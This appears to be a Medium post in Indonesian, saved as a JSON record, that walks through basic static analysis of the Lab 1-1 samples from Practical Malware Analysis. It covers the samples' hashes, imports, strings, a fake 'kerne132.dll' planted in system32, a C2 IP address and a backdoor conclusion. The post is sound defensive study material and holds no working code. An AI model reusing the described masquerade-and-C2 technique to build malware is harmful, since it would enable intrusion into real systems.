  {
    "id": "https://medium.com/p/9ec2a10802a7",
    "slug": "https://medium.com/p/9ec2a10802a7",
    "title": "Practical Malware Analysis — Lab 1.1",
    "content": "\n<h3>Practical Malware Analysis — Lab 1.1</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/850/1*2OPm7aU0Uzk7u9-L3ySv8w.png\"></figure><h4>Basic Static Analysis</h4>\n<p>Tujuan dari analisis statis malware adalah untuk memahami karakteristik dan fitur malware tanpa menjalankannya secara aktif. Dengan menganalisis struktur berkas, kode biner, dan komponen lain dari sampel malware, tujuan ini mencakup mengidentifikasi tanda-tanda ancaman, mengungkapkan taktik pengaburan yang digunakan oleh penyerang, dan mendapatkan pemahaman awal tentang perilaku malware.</p>\n<p>Berikut informasi dasar terkait File Malware yang akan kita analisa :</p>\n<pre>Nama Malware  : Mal01-01.dll<br>Jenis Malware : Trojan/Win32<br>SHA256        : f50e42c8dfaab649bde0398867e930b86c2a599e8db83b8260393082268f2dba<br>SHA-1         : a4b35de71ca20fe776dc72d12fb2886736f43c22 <br>MD5           : 290934c61de9176ad682ffdd65f0a669 </pre>\n<pre>Nama Malware  : Mal01-01.exe <br>Jenis Malware : Trojan/Win32<br>SHA256        : 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 <br>SHA-1         : 9dce39ac1bd36d877fdb0025ee88fdaff0627cdb <br>MD5           : bb7425b82141a1c0f7d60e5106676bb1 </pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*eI050nuhy-r9LvR4RSZYbg.png\"><figcaption>VT Result For Mal01–01.dll</figcaption></figure><p>34/68 Antivirus mendeteksi File <em>.dll</em> sebagai Malicious Trojan.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*0sFTyXzNSUgv5Tho_MIVkg.png\"><figcaption>VT Result For Mal01–01.exe</figcaption></figure><p>sedangkan untuk file <em>.exe </em>sebanyak 52/71 Antivirus juga mendeteksi sebagai Malicious Trojan.</p>\n<h4><strong>Lingkungan Analisis</strong></h4>\n<p>Analisis malware dilakukan dalam lingkungan yang terisolasi dan aman untuk mencegah penyebaran dan dampak negatif yang lebih luas. Lingkungan ini dirancang khusus untuk menganalisis sampel malware tanpa mengorbankan keamanan dan integritas sistem utama.</p>\n<ul>\n<li>Virtual Machine (VM) : FlareVM</li>\n<li>Tools : Depedency Walker, PE Studio Pro, PEview, CFF Explorer</li>\n</ul>\n<h4>Static Analysis</h4>\n<ol><li>Informasi Malware:</li></ol>\n<ul>\n<li>Tipe : Executable (EXE)</li>\n<li>Ekstensi : <em>.exe</em>\n</li>\n<li>Metadata : N/A</li>\n<li>Signature : Microsoft Visual C++ 6.0 DLL (Debug)</li>\n<li>Waktu Pembuatan : 19-Desember-2010, 16:16:38</li>\n</ul>\n<p>2. Struktur Malware</p>\n<ul>\n<li>\n<strong>Tabel Eksekusi (Section Table)</strong> : Terdapat beberapa bagian (sections) seperti “.text”, “.data”, “.rdata”, dan “.reloc” dalam berkas yang mengandung kode, data, sumber daya, dan informasi impor.</li>\n<li>\n<strong>Entry Point</strong> : 00001820</li>\n</ul>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1003/1*Xxp92s78bhII06ZJd-VQng.png\"><figcaption>Entry Point</figcaption></figure><pre><br>    Mal01-01.exe:<br>        Virtual Size: 970<br>        Size of Raw Data: 1000<br>    Mal01-01.dll:<br>        Virtual Size: 39E<br>        Size of Raw Data: 1000</pre>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/868/1*Lgz8__eOmHOZeN1STa6fbA.png\"><figcaption>IMPORT Address Table</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/853/1*M5xHufH1uL6eC02MZOBm_w.png\"><figcaption>IMPORT Directory Table</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/643/1*uyJjYoTDBfeah7Zjj7fnAw.png\"><figcaption>IMPORT Name Table</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/998/1*SprAYDSRbZNDj89qAf2u3Q.png\"><figcaption>IMPORT Hints &amp; DLL Names</figcaption></figure><ul><li>Header Malware :</li></ul>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/794/1*MKOF7sA5bNFFS1fNBkB_rw.png\"><figcaption>Header Information</figcaption></figure><p><strong>Analisis Kode</strong></p>\n<ol><li>Analisis Strings</li></ol>\n<ul><li><strong>Mal01–01.exe</strong></li></ul>\n<p>File ini melakukan operasi sistem file yang sama, karena memuat beberapa fungsi. Beberapa dari fungsi ini memungkinkan program untuk mencari file,membuat serta menyalin file.</p>\n<pre>======================<br>KERNEL32.dll<br>======================<br>UnmapViewOfFile<br>MapViewOfFile<br>CreateFileMappingA<br>CreateFileA<br>FindClose<br>FindNextFileA<br>FindFirstFileA<br>CopyFileA</pre>\n<p>Deskripsi mengenai pemanggilan fungsi API Windows pada file <em>Mal01–01.exe</em> adalah sebagai berikut :</p>\n<ol><li>UnmapViewOfFile :</li></ol>\n<ul>\n<li>Fungsi untuk memutuskan pemetaan (mapping) dari alamat memori yang telah di-mapping sebelumnya.</li>\n<li>Digunakan untuk melepaskan pemetaan memori setelah selesai penggunaan.</li>\n</ul>\n<p>2. MapViewOfFile :</p>\n<ul>\n<li>Fungsi untuk membuat pemetaan memori dari suatu berkas ke dalam ruang alamat memori proses.</li>\n<li>Digunakan untuk memungkinkan akses berkas seolah-olah itu adalah bagian dari memori.</li>\n</ul>\n<p>3. CreateFileMappingA :</p>\n<ul>\n<li>Fungsi untuk membuat objek berkas mapping yang dapat digunakan oleh berbagai proses.</li>\n<li>Digunakan untuk berbagi data di antara proses dengan membuat pemetaan berkas ke dalam memori bersama.</li>\n</ul>\n<p>4. CreateFileA :</p>\n<ul>\n<li>Fungsi untuk membuka atau membuat berkas.</li>\n<li>Digunakan untuk mengakses atau menciptakan berkas dengan parameter seperti nama berkas, hak akses, dan atribut.</li>\n</ul>\n<p>5. FindClose :</p>\n<ul>\n<li>Fungsi untuk menutup handle pencarian yang dibuka sebelumnya menggunakan fungsi FindFirstFile atau FindNextFile.</li>\n<li>Digunakan untuk membersihkan sumber daya setelah selesai pencarian berkas.</li>\n</ul>\n<p>6. FindNextFileA :</p>\n<ul>\n<li>Fungsi untuk menemukan berkas berikutnya yang sesuai dengan pola pencarian setelah pemanggilan FindFirstFile.</li>\n<li>Digunakan dalam pencarian berkas berdasarkan kriteria tertentu.</li>\n</ul>\n<p>7. FindFirstFileA :</p>\n<ul>\n<li>Fungsi untuk memulai pencarian berkas dengan pola pencarian tertentu.</li>\n<li>Digunakan untuk mencari berkas pertama yang sesuai dengan kriteria pencarian.</li>\n</ul>\n<p>8. CopyFileA :</p>\n<ul>\n<li>Fungsi untuk menyalin berkas dari lokasi sumber ke lokasi tujuan.</li>\n<li>Digunakan untuk melakukan salinan berkas dengan parameter seperti nama berkas sumber dan tujuan.</li>\n</ul>\n<p>Berikut hasil capture Strings dari file <em>.exe </em>:</p>\n<pre>strings Mal01-01.exe<br>...<br>kerne132.dll<br>kernel32.dll<br>.exe<br>C:\\*<br>C:\\windows\\system32\\kerne132.dll<br>Kernel32.<br>Mal01-01.dll<br>C:\\Windows\\System32\\Kernel32.dll<br>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</pre>\n<p>File ini tampaknya melakukan beberapa operasi dengan file bernama <em>Mal01–01.dll </em>dan Juga melakukan sesuatu dengan kernel32.dll bawaan library windows, ada indikasi bahwa file tersebut di modifikasi, karena kita dapat melihat file lain yang disebut kerne132.dll, dengan huruf L berubah untuk menjadi angka ‘1’.</p>\n<ul><li><strong>Mal01–01.dll</strong></li></ul>\n<p>Sedangkan untuk file ini melakukan beberapa operasi jaringan dan proses, seperti membuat mutex atau proses baru, berdasarkan fungsi yang diimpor.</p>\n<pre>======================<br>KERNEL32.dll<br>======================<br>Sleep<br>CreateProcessA<br>CreateMutexA<br>OpenMutexA<br>CloseHandle<br><br>======================<br>WS2_32.dll<br>======================<br>socket<br>WSAStartup<br>inet_addr<br>connect<br>send<br>shutdown<br>recv<br>closesocket<br>WSACleanup<br>htons</pre>\n<p>Berikut adalah deskripsi singkat dari pemanggilan fungsi API yang terdapat pada file <em>Mal01–01.dll</em>:</p>\n<ol>\n<li>Sleep: Fungsi ini menghentikan eksekusi program untuk jangka waktu tertentu. Biasanya digunakan untuk menambahkan penundaan dalam eksekusi, yang dapat digunakan dalam teknik penghindaran analisis atau untuk mengatur jangka waktu tertentu dalam eksploitasi.</li>\n<li>CreateProcessA: Fungsi ini digunakan untuk membuat proses baru. Itu dapat digunakan untuk menjalankan berkas atau aplikasi lain dengan parameter yang ditentukan. Dalam konteks malware, dapat digunakan untuk menjalankan komponen berbahaya atau eksekusi tambahan.</li>\n<li>CreateMutexA: Fungsi ini digunakan untuk membuat objek mutex (synchronizing primitive) dengan nama yang ditentukan. Dalam pengaturan malware, dapat digunakan untuk menghindari eksekusi ganda atau untuk mengidentifikasi apakah malware sudah berjalan sebelumnya.</li>\n<li>OpenMutexA: Fungsi ini digunakan untuk membuka objek mutex yang sudah ada dengan nama yang ditentukan. Digunakan untuk memeriksa apakah mutex sudah ada dan apakah malware telah berjalan sebelumnya.</li>\n<li>CloseHandle: Fungsi ini digunakan untuk menutup handle objek yang dibuka sebelumnya, seperti handle proses atau handle berkas. Menghindari kebocoran sumber daya.</li>\n<li>socket: Fungsi ini digunakan untuk membuat soket yang dapat digunakan untuk komunikasi jaringan. Ini adalah langkah awal dalam membangun koneksi jaringan.</li>\n<li>WSAStartup: Fungsi ini menginisialisasi pustaka Winsock yang diperlukan untuk berkomunikasi melalui soket dalam lingkungan Windows.</li>\n<li>inet_addr: Fungsi ini digunakan untuk mengonversi alamat IP dalam format string menjadi bentuk yang dapat dikenali oleh komputer.</li>\n<li>connect: Fungsi ini digunakan untuk menghubungkan soket dengan alamat IP dan nomor port tertentu untuk membentuk koneksi jaringan.</li>\n<li>send: Fungsi ini digunakan untuk mengirim data melalui soket yang sudah terhubung.</li>\n<li>shutdown: Fungsi ini digunakan untuk mengakhiri koneksi jaringan yang sudah terhubung.</li>\n<li>recv: Fungsi ini digunakan untuk menerima data melalui soket yang sudah terhubung.</li>\n<li>closesocket: Fungsi ini digunakan untuk menutup soket yang sudah tidak digunakan lagi.</li>\n<li>WSACleanup: Fungsi ini membersihkan inisialisasi pustaka Winsock setelah selesai digunakan.</li>\n<li>htons: Fungsi ini digunakan untuk mengonversi nomor port dalam format host menjadi format jaringan.</li>\n</ol>\n<p>Pemanggilan fungsi API ini mencerminkan interaksi malware dengan sistem operasi dan jaringan. Dalam konteks analisis malware, pemahaman tentang fungsi-fungsi ini membantu dalam mengidentifikasi perilaku dan tujuan yang mungkin terkait dengan aktivitas berbahaya.</p>\n<p>Berikut hasil Strings Capture dari file <em>.dll</em></p>\n<pre>strings Mal01-01.dll<br>...<br>hello<br>127.26.152.13<br>SADFHUHF<br>...</pre>\n<p>Kita dapat melihat terdapat alamat IP yang menandakan bahwa alamat IP tersebut merupakan alamat C&amp;C. Dan juga terdapat string <em>SADFHUHF</em> bisa menjadi nama mutex yang dibuat oleh malware.</p>\n<p><strong>Kesimpulan</strong></p>\n<p>Berdasarkan hasil analisa di atas, bahwa eksekusi digunakan untuk menjalankan DLL yang berperan sebagai <em>Backdoor </em>atau Remote Access Trojan(RAT). Dilihat dari impor yang dilakukan, saat file <em>.exe </em>dijalankan akan mencari file C:\\windows\\system32\\kerne132.dll, dan jika tidak ditemukan, kemungkinan akan mencoba menyalin DLL berbahaya ke lokasi C:\\windows\\system32\\kerne132.dll. Setelah menjalankan DLL tersebut, terlihat bahwa ada komunikasi dengan server C2 di alamat IP 127.26.152.13.</p>\n<ul>\n<li>Mal01–01.exe : file ini menyalin file <em>Mal01–01.dll</em> ke <em>C:\\windows\\system32\\</em> dengan nama <em>kerne132.dll</em> (mengubah <em>L</em> menjadi <em>1</em> ).</li>\n<li>Mal01–01.dll: file ini menjalankan beberapa proses dan melakukan beberapa permintaan jaringan ke alamat IP <em>127.26.152.13</em>.</li>\n</ul>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=9ec2a10802a7\" width=\"1\" height=\"1\" alt=\"\">\n",
    "tags": [
      "malware-analysis",
      "cybersecurity"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/practical-malware-analysis-lab-1-1-9ec2a10802a7?source=rss-e8b9da247cdf------2"
  }
]